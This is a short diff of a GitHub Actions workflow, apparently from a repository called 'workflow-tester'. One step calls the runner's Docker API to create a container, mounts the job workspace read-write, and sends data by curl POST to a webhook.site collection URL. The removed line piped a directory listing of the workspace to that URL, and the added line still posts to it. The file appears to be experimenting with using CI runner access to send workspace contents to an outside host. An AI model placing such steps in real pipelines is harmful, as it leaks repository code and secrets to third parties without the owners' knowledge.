@@ -17,7 +17,7 @@ jobs:
           "http:/v1.34/containers/create?name=kewl" \
           -X POST \
           -H "Content-Type: application/json" \
-          -d '{ "Image": "alpine/curl:latest", "AttachStdout": true,"Volumes": {"/home/runner/work/workflow-tester/workflow-tester":{"bind":"/home/runner/work/workflow-tester/workflow-tester","mode":"rw"}}, "Shell": [ "ls","|", "curl","-X","POST","--data-binary" ,"@-" ,"https://webhook.site/a5f2df3f-89ee-409d-95fc-b093b6ecab55" ] }'
+          -d '{ "Image": "alpine/curl:latest", "AttachStdout": true,"Volumes": {"/home/runner/work/workflow-tester/workflow-tester":{"bind":"/home/runner/work/workflow-tester/workflow-tester","mode":"rw"}}, "Shell": [ "curl","-X","POST","https://webhook.site/a5f2df3f-89ee-409d-95fc-b093b6ecab55" ] }'
       - run : echo "Starting container...  ."    
       - run : |
           curl \
